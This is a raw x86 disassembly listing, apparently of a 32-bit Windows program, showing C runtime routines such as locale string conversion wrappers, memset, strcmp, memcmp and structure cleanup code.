  427770:	cmp    DWORD PTR [ebp+0x1c],ebx
  427773:	je     0x427831
  427779:	cmp    edi,DWORD PTR [ebp+0x1c]
  42777c:	jg     0x427831
  427782:	push   DWORD PTR [ebp+0x1c]
  427785:	push   DWORD PTR [ebp+0x18]
  427788:	push   esi
  427789:	push   DWORD PTR [ebp-0x2c]
  42778c:	push   DWORD PTR [ebp+0xc]
  42778f:	push   DWORD PTR [ebp+0x8]
  427792:	call   DWORD PTR ds:0x429108
  427798:	jmp    0x427831
  42779d:	mov    DWORD PTR [ebp-0x4],0x2
  4277a4:	lea    eax,[edi+edi*1]
  4277a7:	add    eax,0x3
  4277aa:	and    eax,0xfffffffc
  4277ad:	call   0x4252e0
  4277b2:	mov    DWORD PTR [ebp-0x18],esp
  4277b5:	mov    eax,esp
  4277b7:	mov    DWORD PTR [ebp-0x30],eax
  4277ba:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277be:	jmp    0x4277db
  4277c0:	xor    eax,eax
  4277c2:	inc    eax
  4277c3:	ret    
  4277c4:	mov    esp,DWORD PTR [ebp-0x18]
  4277c7:	call   0x428725
  4277cc:	xor    ebx,ebx
  4277ce:	mov    DWORD PTR [ebp-0x30],ebx
  4277d1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277d5:	mov    edi,DWORD PTR [ebp-0x1c]
  4277d8:	mov    esi,DWORD PTR [ebp-0x28]
  4277db:	cmp    DWORD PTR [ebp-0x30],ebx
  4277de:	jne    0x4277f8
  4277e0:	lea    eax,[edi+edi*1]
  4277e3:	push   eax
  4277e4:	call   0x425fb2
  4277e9:	pop    ecx
  4277ea:	mov    DWORD PTR [ebp-0x30],eax
  4277ed:	cmp    eax,ebx
  4277ef:	je     0x427831
  4277f1:	mov    DWORD PTR [ebp-0x24],0x1
  4277f8:	push   edi
  4277f9:	push   DWORD PTR [ebp-0x30]
  4277fc:	push   esi
  4277fd:	push   DWORD PTR [ebp-0x2c]
  427800:	push   DWORD PTR [ebp+0xc]
  427803:	push   DWORD PTR [ebp+0x8]
  427806:	call   DWORD PTR ds:0x429108
  42780c:	test   eax,eax
  42780e:	je     0x427831
  427810:	push   ebx
  427811:	push   ebx
  427812:	cmp    DWORD PTR [ebp+0x1c],ebx
  427815:	jne    0x42781b
  427817:	push   ebx
  427818:	push   ebx
  427819:	jmp    0x427821
  42781b:	push   DWORD PTR [ebp+0x1c]
  42781e:	push   DWORD PTR [ebp+0x18]
  427821:	push   edi
  427822:	push   DWORD PTR [ebp-0x30]
  427825:	push   ebx
  427826:	push   DWORD PTR [ebp+0x20]
  427829:	call   DWORD PTR ds:0x429098
  42782f:	mov    edi,eax
  427831:	cmp    DWORD PTR [ebp-0x24],ebx
  427834:	je     0x42783f
  427836:	push   DWORD PTR [ebp-0x30]
  427839:	call   0x425e9a
  42783e:	pop    ecx
  42783f:	cmp    DWORD PTR [ebp-0x20],ebx
  427842:	je     0x42784d
  427844:	push   DWORD PTR [ebp-0x2c]
  427847:	call   0x425e9a
  42784c:	pop    ecx
  42784d:	mov    eax,edi
  42784f:	jmp    0x4279af
  427854:	mov    DWORD PTR [ebp-0x34],ebx
  427857:	xor    edi,edi
  427859:	mov    DWORD PTR [ebp-0x38],ebx
  42785c:	cmp    DWORD PTR [ebp+0x8],ebx
  42785f:	jne    0x427869
  427861:	mov    eax,ds:0x467364
  427866:	mov    DWORD PTR [ebp+0x8],eax
  427869:	cmp    DWORD PTR [ebp+0x20],ebx
  42786c:	jne    0x427876
  42786e:	mov    eax,ds:0x467374
  427873:	mov    DWORD PTR [ebp+0x20],eax
  427876:	push   DWORD PTR [ebp+0x8]
  427879:	call   0x42850d
  42787e:	pop    ecx
  42787f:	mov    DWORD PTR [ebp-0x3c],eax
  427882:	cmp    eax,0xffffffff
  427885:	jne    0x42788e
  427887:	xor    eax,eax
  427889:	jmp    0x4279af
  42788e:	cmp    eax,DWORD PTR [ebp+0x20]
  427891:	je     0x427985
  427897:	push   ebx
  427898:	push   ebx
  427899:	lea    ecx,[ebp+0x14]
  42789c:	push   ecx
  42789d:	push   DWORD PTR [ebp+0x10]
  4278a0:	push   eax
  4278a1:	push   DWORD PTR [ebp+0x20]
  4278a4:	call   0x428556
  4278a9:	add    esp,0x18
  4278ac:	mov    DWORD PTR [ebp-0x34],eax
  4278af:	cmp    eax,ebx
  4278b1:	je     0x427887
  4278b3:	push   ebx
  4278b4:	push   ebx
  4278b5:	push   DWORD PTR [ebp+0x14]
  4278b8:	push   eax
  4278b9:	push   DWORD PTR [ebp+0xc]
  4278bc:	push   DWORD PTR [ebp+0x8]
  4278bf:	call   DWORD PTR ds:0x429100
  4278c5:	mov    esi,eax
  4278c7:	mov    DWORD PTR [ebp-0x40],esi
  4278ca:	cmp    esi,ebx
  4278cc:	je     0x427974
  4278d2:	mov    DWORD PTR [ebp-0x4],ebx
  4278d5:	add    eax,0x3
  4278d8:	and    eax,0xfffffffc
  4278db:	call   0x4252e0
  4278e0:	mov    DWORD PTR [ebp-0x18],esp
  4278e3:	mov    edi,esp
  4278e5:	mov    DWORD PTR [ebp-0x44],edi
  4278e8:	push   esi
  4278e9:	push   ebx
  4278ea:	push   edi
  4278eb:	call   0x427b90
  4278f0:	add    esp,0xc
  4278f3:	jmp    0x427905
  4278f5:	xor    eax,eax
  4278f7:	inc    eax
  4278f8:	ret    
  4278f9:	mov    esp,DWORD PTR [ebp-0x18]
  4278fc:	call   0x428725
  427901:	xor    ebx,ebx
  427903:	xor    edi,edi
  427905:	or     DWORD PTR [ebp-0x4],0xffffffff
  427909:	cmp    edi,ebx
  42790b:	jne    0x427930
  42790d:	push   DWORD PTR [ebp-0x40]
  427910:	call   0x425fb2
  427915:	pop    ecx
  427916:	mov    edi,eax
  427918:	cmp    edi,ebx
  42791a:	je     0x42794d
  42791c:	push   DWORD PTR [ebp-0x40]
  42791f:	push   ebx
  427920:	push   edi
  427921:	call   0x427b90
  427926:	add    esp,0xc
  427929:	mov    DWORD PTR [ebp-0x38],0x1
  427930:	push   DWORD PTR [ebp-0x40]
  427933:	push   edi
  427934:	push   DWORD PTR [ebp+0x14]
  427937:	push   DWORD PTR [ebp-0x34]
  42793a:	push   DWORD PTR [ebp+0xc]
  42793d:	push   DWORD PTR [ebp+0x8]
  427940:	call   DWORD PTR ds:0x429100
  427946:	mov    DWORD PTR [ebp-0x40],eax
  427949:	cmp    eax,ebx
  42794b:	jne    0x427951
  42794d:	xor    esi,esi
  42794f:	jmp    0x427977
  427951:	push   DWORD PTR [ebp+0x1c]
  427954:	push   DWORD PTR [ebp+0x18]
  427957:	lea    eax,[ebp-0x40]
  42795a:	push   eax
  42795b:	push   edi
  42795c:	push   DWORD PTR [ebp+0x20]
  42795f:	push   DWORD PTR [ebp-0x3c]
  427962:	call   0x428556
  427967:	add    esp,0x18
  42796a:	mov    esi,eax
  42796c:	neg    esi
  42796e:	sbb    esi,esi
  427970:	neg    esi
  427972:	jmp    0x427977
  427974:	mov    esi,DWORD PTR [ebp-0x48]
  427977:	cmp    DWORD PTR [ebp-0x38],ebx
  42797a:	je     0x42799f
  42797c:	push   edi
  42797d:	call   0x425e9a
  427982:	pop    ecx
  427983:	jmp    0x42799f
  427985:	push   DWORD PTR [ebp+0x1c]
  427988:	push   DWORD PTR [ebp+0x18]
  42798b:	push   DWORD PTR [ebp+0x14]
  42798e:	push   DWORD PTR [ebp+0x10]
  427991:	push   DWORD PTR [ebp+0xc]
  427994:	push   DWORD PTR [ebp+0x8]
  427997:	call   DWORD PTR ds:0x429100
  42799d:	mov    esi,eax
  42799f:	cmp    DWORD PTR [ebp-0x34],ebx
  4279a2:	je     0x4279ad
  4279a4:	push   DWORD PTR [ebp-0x34]
  4279a7:	call   0x425e9a
  4279ac:	pop    ecx
  4279ad:	mov    eax,esi
  4279af:	lea    esp,[ebp-0x54]
  4279b2:	call   0x4252cb
  4279b7:	ret    
  4279b8:	push   0x1c
  4279ba:	push   0x429dd0
  4279bf:	call   0x425290
  4279c4:	xor    esi,esi
  4279c6:	cmp    DWORD PTR ds:0x467380,esi
  4279cc:	jne    0x427a03
  4279ce:	lea    eax,[ebp-0x1c]
  4279d1:	push   eax
  4279d2:	xor    edi,edi
  4279d4:	inc    edi
  4279d5:	push   edi
  4279d6:	push   0x429da4
  4279db:	push   edi
  4279dc:	call   DWORD PTR ds:0x429110
  4279e2:	test   eax,eax
  4279e4:	je     0x4279ee
  4279e6:	mov    DWORD PTR ds:0x467380,edi
  4279ec:	jmp    0x427a03
  4279ee:	call   DWORD PTR ds:0x429034
  4279f4:	cmp    eax,0x78
  4279f7:	jne    0x427a03
  4279f9:	mov    DWORD PTR ds:0x467380,0x2
  427a03:	mov    eax,ds:0x467380
  427a08:	cmp    eax,0x2
  427a0b:	je     0x427afb
  427a11:	cmp    eax,esi
  427a13:	je     0x427afb
  427a19:	cmp    eax,0x1
  427a1c:	jne    0x427b21
  427a22:	mov    DWORD PTR [ebp-0x20],esi
  427a25:	mov    DWORD PTR [ebp-0x24],esi
  427a28:	cmp    DWORD PTR [ebp+0x18],esi
  427a2b:	jne    0x427a35
  427a2d:	mov    eax,ds:0x467374
  427a32:	mov    DWORD PTR [ebp+0x18],eax
  427a35:	push   esi
  427a36:	push   esi
  427a37:	push   DWORD PTR [ebp+0x10]
  427a3a:	push   DWORD PTR [ebp+0xc]
  427a3d:	xor    eax,eax
  427a3f:	cmp    DWORD PTR [ebp+0x20],esi
  427a42:	setne  al
  427a45:	lea    eax,[eax*8+0x1]
  427a4c:	push   eax
  427a4d:	push   DWORD PTR [ebp+0x18]
  427a50:	call   DWORD PTR ds:0x429104
  427a56:	mov    edi,eax
  427a58:	mov    DWORD PTR [ebp-0x28],edi
  427a5b:	test   edi,edi
  427a5d:	je     0x427b21
  427a63:	and    DWORD PTR [ebp-0x4],0x0
  427a67:	lea    ebx,[edi+edi*1]
  427a6a:	mov    eax,ebx
  427a6c:	add    eax,0x3
  427a6f:	and    eax,0xfffffffc
  427a72:	call   0x4252e0
  427a77:	mov    DWORD PTR [ebp-0x18],esp
  427a7a:	mov    esi,esp
  427a7c:	mov    DWORD PTR [ebp-0x2c],esi
  427a7f:	push   ebx
  427a80:	push   0x0
  427a82:	push   esi
  427a83:	call   0x427b90
  427a88:	add    esp,0xc
  427a8b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427a8f:	jmp    0x427aa6
  427a91:	xor    eax,eax
  427a93:	inc    eax
  427a94:	ret    
  427a95:	mov    esp,DWORD PTR [ebp-0x18]
  427a98:	call   0x428725
  427a9d:	xor    esi,esi
  427a9f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa3:	mov    edi,DWORD PTR [ebp-0x28]
  427aa6:	test   esi,esi
  427aa8:	jne    0x427ac1
  427aaa:	push   edi
  427aab:	push   0x2
  427aad:	call   0x4263a8
  427ab2:	pop    ecx
  427ab3:	pop    ecx
  427ab4:	mov    esi,eax
  427ab6:	test   esi,esi
  427ab8:	je     0x427b21
  427aba:	mov    DWORD PTR [ebp-0x24],0x1
  427ac1:	push   edi
  427ac2:	push   esi
  427ac3:	push   DWORD PTR [ebp+0x10]
  427ac6:	push   DWORD PTR [ebp+0xc]
  427ac9:	push   0x1
  427acb:	push   DWORD PTR [ebp+0x18]
  427ace:	call   DWORD PTR ds:0x429104
  427ad4:	test   eax,eax
  427ad6:	je     0x427ae9
  427ad8:	push   DWORD PTR [ebp+0x14]
  427adb:	push   eax
  427adc:	push   esi
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429110
  427ae6:	mov    DWORD PTR [ebp-0x20],eax
  427ae9:	cmp    DWORD PTR [ebp-0x24],0x0
  427aed:	je     0x427af6
  427aef:	push   esi
  427af0:	call   0x425e9a
  427af5:	pop    ecx
  427af6:	mov    eax,DWORD PTR [ebp-0x20]
  427af9:	jmp    0x427b69
  427afb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427afe:	cmp    ebx,esi
  427b00:	jne    0x427b08
  427b02:	mov    ebx,DWORD PTR ds:0x467364
  427b08:	mov    edi,DWORD PTR [ebp+0x18]
  427b0b:	test   edi,edi
  427b0d:	jne    0x427b15
  427b0f:	mov    edi,DWORD PTR ds:0x467374
  427b15:	push   ebx
  427b16:	call   0x42850d
  427b1b:	pop    ecx
  427b1c:	cmp    eax,0xffffffff
  427b1f:	jne    0x427b25
  427b21:	xor    eax,eax
  427b23:	jmp    0x427b69
  427b25:	cmp    eax,edi
  427b27:	je     0x427b47
  427b29:	push   0x0
  427b2b:	push   0x0
  427b2d:	lea    ecx,[ebp+0x10]
  427b30:	push   ecx
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   eax
  427b35:	push   edi
  427b36:	call   0x428556
  427b3b:	add    esp,0x18
  427b3e:	mov    esi,eax
  427b40:	test   esi,esi
  427b42:	je     0x427b21
  427b44:	mov    DWORD PTR [ebp+0xc],esi
  427b47:	push   DWORD PTR [ebp+0x14]
  427b4a:	push   DWORD PTR [ebp+0x10]
  427b4d:	push   DWORD PTR [ebp+0xc]
  427b50:	push   DWORD PTR [ebp+0x8]
  427b53:	push   ebx
  427b54:	call   DWORD PTR ds:0x42910c
  427b5a:	mov    edi,eax
  427b5c:	test   esi,esi
  427b5e:	je     0x427b67
  427b60:	push   esi
  427b61:	call   0x425e9a
  427b66:	pop    ecx
  427b67:	mov    eax,edi
  427b69:	lea    esp,[ebp-0x38]
  427b6c:	call   0x4252cb
  427b71:	ret    
  427b72:	mov    eax,ds:0x467384
  427b77:	test   eax,eax
  427b79:	je     0x427b8a
  427b7b:	push   DWORD PTR [esp+0x4]
  427b7f:	call   eax
  427b81:	test   eax,eax
  427b83:	pop    ecx
  427b84:	je     0x427b8a
  427b86:	xor    eax,eax
  427b88:	inc    eax
  427b89:	ret    
  427b8a:	xor    eax,eax
  427b8c:	ret    
  427b8d:	int3   
  427b8e:	int3   
  427b8f:	int3   
  427b90:	mov    edx,DWORD PTR [esp+0xc]
  427b94:	mov    ecx,DWORD PTR [esp+0x4]
  427b98:	test   edx,edx
  427b9a:	je     0x427beb
  427b9c:	xor    eax,eax
  427b9e:	mov    al,BYTE PTR [esp+0x8]
  427ba2:	push   edi
  427ba3:	mov    edi,ecx
  427ba5:	cmp    edx,0x4
  427ba8:	jb     0x427bdb
  427baa:	neg    ecx
  427bac:	and    ecx,0x3
  427baf:	je     0x427bbd
  427bb1:	sub    edx,ecx
  427bb3:	mov    BYTE PTR [edi],al
  427bb5:	add    edi,0x1
  427bb8:	sub    ecx,0x1
  427bbb:	jne    0x427bb3
  427bbd:	mov    ecx,eax
  427bbf:	shl    eax,0x8
  427bc2:	add    eax,ecx
  427bc4:	mov    ecx,eax
  427bc6:	shl    eax,0x10
  427bc9:	add    eax,ecx
  427bcb:	mov    ecx,edx
  427bcd:	and    edx,0x3
  427bd0:	shr    ecx,0x2
  427bd3:	je     0x427bdb
  427bd5:	rep stos DWORD PTR es:[edi],eax
  427bd7:	test   edx,edx
  427bd9:	je     0x427be5
  427bdb:	mov    BYTE PTR [edi],al
  427bdd:	add    edi,0x1
  427be0:	sub    edx,0x1
  427be3:	jne    0x427bdb
  427be5:	mov    eax,DWORD PTR [esp+0x8]
  427be9:	pop    edi
  427bea:	ret    
  427beb:	mov    eax,DWORD PTR [esp+0x4]
  427bef:	ret    
  427bf0:	push   esi
  427bf1:	mov    esi,DWORD PTR [esp+0x8]
  427bf5:	test   esi,esi
  427bf7:	je     0x427d7e
  427bfd:	push   DWORD PTR [esi+0x4]
  427c00:	call   0x425e9a
  427c05:	push   DWORD PTR [esi+0x8]
  427c08:	call   0x425e9a
  427c0d:	push   DWORD PTR [esi+0xc]
  427c10:	call   0x425e9a
  427c15:	push   DWORD PTR [esi+0x10]
  427c18:	call   0x425e9a
  427c1d:	push   DWORD PTR [esi+0x14]
  427c20:	call   0x425e9a
  427c25:	push   DWORD PTR [esi+0x18]
  427c28:	call   0x425e9a
  427c2d:	push   DWORD PTR [esi]
  427c2f:	call   0x425e9a
  427c34:	push   DWORD PTR [esi+0x20]
  427c37:	call   0x425e9a
  427c3c:	push   DWORD PTR [esi+0x24]
  427c3f:	call   0x425e9a
  427c44:	push   DWORD PTR [esi+0x28]
  427c47:	call   0x425e9a
  427c4c:	push   DWORD PTR [esi+0x2c]
  427c4f:	call   0x425e9a
  427c54:	push   DWORD PTR [esi+0x30]
  427c57:	call   0x425e9a
  427c5c:	push   DWORD PTR [esi+0x34]
  427c5f:	call   0x425e9a
  427c64:	push   DWORD PTR [esi+0x1c]
  427c67:	call   0x425e9a
  427c6c:	push   DWORD PTR [esi+0x38]
  427c6f:	call   0x425e9a
  427c74:	push   DWORD PTR [esi+0x3c]
  427c77:	call   0x425e9a
  427c7c:	add    esp,0x40
  427c7f:	push   DWORD PTR [esi+0x40]
  427c82:	call   0x425e9a
  427c87:	push   DWORD PTR [esi+0x44]
  427c8a:	call   0x425e9a
  427c8f:	push   DWORD PTR [esi+0x48]
  427c92:	call   0x425e9a
  427c97:	push   DWORD PTR [esi+0x4c]
  427c9a:	call   0x425e9a
  427c9f:	push   DWORD PTR [esi+0x50]
  427ca2:	call   0x425e9a
  427ca7:	push   DWORD PTR [esi+0x54]
  427caa:	call   0x425e9a
  427caf:	push   DWORD PTR [esi+0x58]
  427cb2:	call   0x425e9a
  427cb7:	push   DWORD PTR [esi+0x5c]
  427cba:	call   0x425e9a
  427cbf:	push   DWORD PTR [esi+0x60]
  427cc2:	call   0x425e9a
  427cc7:	push   DWORD PTR [esi+0x64]
  427cca:	call   0x425e9a
  427ccf:	push   DWORD PTR [esi+0x68]
  427cd2:	call   0x425e9a
  427cd7:	push   DWORD PTR [esi+0x6c]
  427cda:	call   0x425e9a
  427cdf:	push   DWORD PTR [esi+0x70]
  427ce2:	call   0x425e9a
  427ce7:	push   DWORD PTR [esi+0x74]
  427cea:	call   0x425e9a
  427cef:	push   DWORD PTR [esi+0x78]
  427cf2:	call   0x425e9a
  427cf7:	push   DWORD PTR [esi+0x7c]
  427cfa:	call   0x425e9a
  427cff:	add    esp,0x40
  427d02:	push   DWORD PTR [esi+0x80]
  427d08:	call   0x425e9a
  427d0d:	push   DWORD PTR [esi+0x84]
  427d13:	call   0x425e9a
  427d18:	push   DWORD PTR [esi+0x88]
  427d1e:	call   0x425e9a
  427d23:	push   DWORD PTR [esi+0x8c]
  427d29:	call   0x425e9a
  427d2e:	push   DWORD PTR [esi+0x90]
  427d34:	call   0x425e9a
  427d39:	push   DWORD PTR [esi+0x94]
  427d3f:	call   0x425e9a
  427d44:	push   DWORD PTR [esi+0x98]
  427d4a:	call   0x425e9a
  427d4f:	push   DWORD PTR [esi+0x9c]
  427d55:	call   0x425e9a
  427d5a:	push   DWORD PTR [esi+0xa0]
  427d60:	call   0x425e9a
  427d65:	push   DWORD PTR [esi+0xa4]
  427d6b:	call   0x425e9a
  427d70:	push   DWORD PTR [esi+0xa8]
  427d76:	call   0x425e9a
  427d7b:	add    esp,0x2c
  427d7e:	pop    esi
  427d7f:	ret    
  427d80:	push   esi
  427d81:	mov    esi,DWORD PTR [esp+0x8]
  427d85:	test   esi,esi
  427d87:	je     0x427ddd
  427d89:	mov    eax,DWORD PTR [esi]
  427d8b:	mov    ecx,DWORD PTR ds:0x466ef4
  427d91:	cmp    eax,DWORD PTR [ecx]
  427d93:	je     0x427da4
  427d95:	cmp    eax,DWORD PTR ds:0x466ec4
  427d9b:	je     0x427da4
  427d9d:	push   eax
  427d9e:	call   0x425e9a
  427da3:	pop    ecx
  427da4:	mov    eax,DWORD PTR [esi+0x4]
  427da7:	mov    ecx,DWORD PTR ds:0x466ef4
  427dad:	cmp    eax,DWORD PTR [ecx+0x4]
  427db0:	je     0x427dc1
  427db2:	cmp    eax,DWORD PTR ds:0x466ec8
  427db8:	je     0x427dc1
  427dba:	push   eax
  427dbb:	call   0x425e9a
  427dc0:	pop    ecx
  427dc1:	mov    esi,DWORD PTR [esi+0x8]
  427dc4:	mov    eax,ds:0x466ef4
  427dc9:	cmp    esi,DWORD PTR [eax+0x8]
  427dcc:	je     0x427ddd
  427dce:	cmp    esi,DWORD PTR ds:0x466ecc
  427dd4:	je     0x427ddd
  427dd6:	push   esi
  427dd7:	call   0x425e9a
  427ddc:	pop    ecx
  427ddd:	pop    esi
  427dde:	ret    
  427ddf:	push   esi
  427de0:	mov    esi,DWORD PTR [esp+0x8]
  427de4:	test   esi,esi
  427de6:	je     0x427eb6
  427dec:	mov    eax,DWORD PTR [esi+0xc]
  427def:	mov    ecx,DWORD PTR ds:0x466ef4
  427df5:	cmp    eax,DWORD PTR [ecx+0xc]
  427df8:	je     0x427e09
  427dfa:	cmp    eax,DWORD PTR ds:0x466ed0
  427e00:	je     0x427e09
  427e02:	push   eax
  427e03:	call   0x425e9a
  427e08:	pop    ecx
  427e09:	mov    eax,DWORD PTR [esi+0x10]
  427e0c:	mov    ecx,DWORD PTR ds:0x466ef4
  427e12:	cmp    eax,DWORD PTR [ecx+0x10]
  427e15:	je     0x427e26
  427e17:	cmp    eax,DWORD PTR ds:0x466ed4
  427e1d:	je     0x427e26
  427e1f:	push   eax
  427e20:	call   0x425e9a
  427e25:	pop    ecx
  427e26:	mov    eax,DWORD PTR [esi+0x14]
  427e29:	mov    ecx,DWORD PTR ds:0x466ef4
  427e2f:	cmp    eax,DWORD PTR [ecx+0x14]
  427e32:	je     0x427e43
  427e34:	cmp    eax,DWORD PTR ds:0x466ed8
  427e3a:	je     0x427e43
  427e3c:	push   eax
  427e3d:	call   0x425e9a
  427e42:	pop    ecx
  427e43:	mov    eax,DWORD PTR [esi+0x18]
  427e46:	mov    ecx,DWORD PTR ds:0x466ef4
  427e4c:	cmp    eax,DWORD PTR [ecx+0x18]
  427e4f:	je     0x427e60
  427e51:	cmp    eax,DWORD PTR ds:0x466edc
  427e57:	je     0x427e60
  427e59:	push   eax
  427e5a:	call   0x425e9a
  427e5f:	pop    ecx
  427e60:	mov    eax,DWORD PTR [esi+0x1c]
  427e63:	mov    ecx,DWORD PTR ds:0x466ef4
  427e69:	cmp    eax,DWORD PTR [ecx+0x1c]
  427e6c:	je     0x427e7d
  427e6e:	cmp    eax,DWORD PTR ds:0x466ee0
  427e74:	je     0x427e7d
  427e76:	push   eax
  427e77:	call   0x425e9a
  427e7c:	pop    ecx
  427e7d:	mov    eax,DWORD PTR [esi+0x20]
  427e80:	mov    ecx,DWORD PTR ds:0x466ef4
  427e86:	cmp    eax,DWORD PTR [ecx+0x20]
  427e89:	je     0x427e9a
  427e8b:	cmp    eax,DWORD PTR ds:0x466ee4
  427e91:	je     0x427e9a
  427e93:	push   eax
  427e94:	call   0x425e9a
  427e99:	pop    ecx
  427e9a:	mov    esi,DWORD PTR [esi+0x24]
  427e9d:	mov    eax,ds:0x466ef4
  427ea2:	cmp    esi,DWORD PTR [eax+0x24]
  427ea5:	je     0x427eb6
  427ea7:	cmp    esi,DWORD PTR ds:0x466ee8
  427ead:	je     0x427eb6
  427eaf:	push   esi
  427eb0:	call   0x425e9a
  427eb5:	pop    ecx
  427eb6:	pop    esi
  427eb7:	ret    
  427eb8:	int3   
  427eb9:	int3   
  427eba:	int3   
  427ebb:	int3   
  427ebc:	int3   
  427ebd:	int3   
  427ebe:	int3   
  427ebf:	int3   
  427ec0:	push   ebp
  427ec1:	mov    ebp,esp
  427ec3:	push   esi
  427ec4:	xor    eax,eax
  427ec6:	push   eax
  427ec7:	push   eax
  427ec8:	push   eax
  427ec9:	push   eax
  427eca:	push   eax
  427ecb:	push   eax
  427ecc:	push   eax
  427ecd:	push   eax
  427ece:	mov    edx,DWORD PTR [ebp+0xc]
  427ed1:	lea    ecx,[ecx+0x0]
  427ed4:	mov    al,BYTE PTR [edx]
  427ed6:	or     al,al
  427ed8:	je     0x427ee3
  427eda:	add    edx,0x1
  427edd:	bts    DWORD PTR [esp],eax
  427ee1:	jmp    0x427ed4
  427ee3:	mov    esi,DWORD PTR [ebp+0x8]
  427ee6:	or     ecx,0xffffffff
  427ee9:	lea    ecx,[ecx+0x0]
  427eec:	add    ecx,0x1
  427eef:	mov    al,BYTE PTR [esi]
  427ef1:	or     al,al
  427ef3:	je     0x427efe
  427ef5:	add    esi,0x1
  427ef8:	bt     DWORD PTR [esp],eax
  427efc:	jae    0x427eec
  427efe:	mov    eax,ecx
  427f00:	add    esp,0x20
  427f03:	pop    esi
  427f04:	leave  
  427f05:	ret    
  427f06:	int3   
  427f07:	int3   
  427f08:	int3   
  427f09:	int3   
  427f0a:	int3   
  427f0b:	int3   
  427f0c:	int3   
  427f0d:	int3   
  427f0e:	int3   
  427f0f:	int3   
  427f10:	mov    edx,DWORD PTR [esp+0x4]
  427f14:	mov    ecx,DWORD PTR [esp+0x8]
  427f18:	test   edx,0x3
  427f1e:	jne    0x427f5c
  427f20:	mov    eax,DWORD PTR [edx]
  427f22:	cmp    al,BYTE PTR [ecx]
  427f24:	jne    0x427f54
  427f26:	or     al,al
  427f28:	je     0x427f50
  427f2a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f2d:	jne    0x427f54
  427f2f:	or     ah,ah
  427f31:	je     0x427f50
  427f33:	shr    eax,0x10
  427f36:	cmp    al,BYTE PTR [ecx+0x2]
  427f39:	jne    0x427f54
  427f3b:	or     al,al
  427f3d:	je     0x427f50
  427f3f:	cmp    ah,BYTE PTR [ecx+0x3]
  427f42:	jne    0x427f54
  427f44:	add    ecx,0x4
  427f47:	add    edx,0x4
  427f4a:	or     ah,ah
  427f4c:	jne    0x427f20
  427f4e:	mov    edi,edi
  427f50:	xor    eax,eax
  427f52:	ret    
  427f53:	nop
  427f54:	sbb    eax,eax
  427f56:	shl    eax,1
  427f58:	add    eax,0x1
  427f5b:	ret    
  427f5c:	test   edx,0x1
  427f62:	je     0x427f7c
  427f64:	mov    al,BYTE PTR [edx]
  427f66:	add    edx,0x1
  427f69:	cmp    al,BYTE PTR [ecx]
  427f6b:	jne    0x427f54
  427f6d:	add    ecx,0x1
  427f70:	or     al,al
  427f72:	je     0x427f50
  427f74:	test   edx,0x2
  427f7a:	je     0x427f20
  427f7c:	mov    ax,WORD PTR [edx]
  427f7f:	add    edx,0x2
  427f82:	cmp    al,BYTE PTR [ecx]
  427f84:	jne    0x427f54
  427f86:	or     al,al
  427f88:	je     0x427f50
  427f8a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f8d:	jne    0x427f54
  427f8f:	or     ah,ah
  427f91:	je     0x427f50
  427f93:	add    ecx,0x2
  427f96:	jmp    0x427f20
  427f98:	int3   
  427f99:	int3   
  427f9a:	int3   
  427f9b:	int3   
  427f9c:	int3   
  427f9d:	int3   
  427f9e:	int3   
  427f9f:	int3   
  427fa0:	mov    eax,DWORD PTR [esp+0xc]
  427fa4:	test   eax,eax
  427fa6:	je     0x427ff2
  427fa8:	mov    edx,DWORD PTR [esp+0x4]
  427fac:	push   esi
  427fad:	push   edi
  427fae:	mov    esi,edx
  427fb0:	mov    edi,DWORD PTR [esp+0x10]
  427fb4:	or     edx,edi
  427fb6:	and    edx,0x3
  427fb9:	je     0x427ff3
  427fbb:	test   eax,0x1
  427fc0:	je     0x427fd3
  427fc2:	mov    cl,BYTE PTR [esi]
  427fc4:	cmp    cl,BYTE PTR [edi]
  427fc6:	jne    0x428020
  427fc8:	add    esi,0x1
  427fcb:	add    edi,0x1
  427fce:	sub    eax,0x1
  427fd1:	je     0x427ff0
  427fd3:	mov    cl,BYTE PTR [esi]
  427fd5:	mov    dl,BYTE PTR [edi]
  427fd7:	cmp    cl,dl
  427fd9:	jne    0x428020
  427fdb:	mov    cl,BYTE PTR [esi+0x1]
  427fde:	mov    dl,BYTE PTR [edi+0x1]
  427fe1:	cmp    cl,dl
  427fe3:	jne    0x428020
  427fe5:	add    edi,0x2
  427fe8:	add    esi,0x2
  427feb:	sub    eax,0x2
  427fee:	jne    0x427fd3
  427ff0:	pop    edi
  427ff1:	pop    esi
  427ff2:	ret    
  427ff3:	mov    ecx,eax
  427ff5:	and    eax,0x3
  427ff8:	shr    ecx,0x2
  427ffb:	je     0x428028
  427ffd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fff:	je     0x428028
  428001:	mov    ecx,DWORD PTR [esi-0x4]
  428004:	mov    edx,DWORD PTR [edi-0x4]
  428007:	cmp    cl,dl
  428009:	jne    0x42801b
  42800b:	cmp    ch,dh
  42800d:	jne    0x42801b
  42800f:	shr    ecx,0x10
  428012:	shr    edx,0x10
  428015:	cmp    cl,dl
  428017:	jne    0x42801b
  428019:	cmp    ch,dh
  42801b:	mov    eax,0x0
  428020:	sbb    eax,eax
  428022:	pop    edi
  428023:	sbb    eax,0xffffffff
  428026:	pop    esi
  428027:	ret    
  428028:	test   eax,eax
  42802a:	je     0x427ff0
  42802c:	mov    edx,DWORD PTR [esi]
  42802e:	mov    ecx,DWORD PTR [edi]
  428030:	cmp    dl,cl
  428032:	jne    0x42801b
  428034:	sub    eax,0x1
  428037:	je     0x428055
  428039:	cmp    dh,ch
  42803b:	jne    0x42801b
  42803d:	sub    eax,0x1
  428040:	je     0x428055
  428042:	and    ecx,0xff0000
  428048:	and    edx,0xff0000
  42804e:	cmp    edx,ecx
  428050:	jne    0x42801b
  428052:	sub    eax,0x1
  428055:	pop    edi
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   edi
  428064:	push   esi
  428065:	push   ebx
  428066:	mov    ecx,DWORD PTR [ebp+0x10]
  428069:	jecxz  0x428092
  42806b:	mov    ebx,ecx
